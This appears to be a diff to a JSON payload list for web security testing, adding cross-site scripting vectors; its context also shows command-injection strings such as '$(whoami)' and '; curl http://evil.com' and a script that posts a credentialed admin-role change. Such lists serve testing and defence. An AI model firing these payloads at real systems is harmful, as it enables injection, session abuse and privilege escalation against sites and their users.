@@ -25,9 +25,17 @@
         "<details open ontoggle=alert('XSS')>",
         "<input autofocus onfocus=alert('XSS')>",
         "<video><source onerror=alert('XSS')>",
-        "<a href='javascript:alert(`XSS`)'>Click</a>",
+        "<a href='javascript:alert(XSS)'>Click</a>",
+        "<p/onclick=alert(/XSS/)>a",
+        "<script>$=1,alert($)</script>",
+        "<script>alert(1)",
+        "<script>alert(1)<!--XSS",
         "\"><svg/onload=confirm(1)>",
-        "<math><mtext></mtext><script>alert('XSS')</script></math>"
+        "<math><mtext></mtext><script>alert('XSS')</script></math>",
+        "<button form=test onformchange=alert(1)>",
+        "<form><button formaction=\"javascript:alert(1)\">",
+        "<details ontoggle=alert('XSS') open>",
+        "'\"><svg/onload=confirm(1)>"
     ],
     "command_injection": [
         "; ls",
@@ -39,7 +47,7 @@
         "; ps aux",
         "; netstat -an",
         "; sleep 5",
-        "`ping -c 1 127.0.0.1`",
+        "ping -c 1 127.0.0.1",
         "$(whoami)",
         "& nslookup example.com",
         "; curl http://evil.com",
@@ -72,4 +80,3 @@
         "<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://example.com/api/setrole');xhr.withCredentials = true;xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');xhr.send('{\"role\":admin}');</script>"
     ]
 }
-
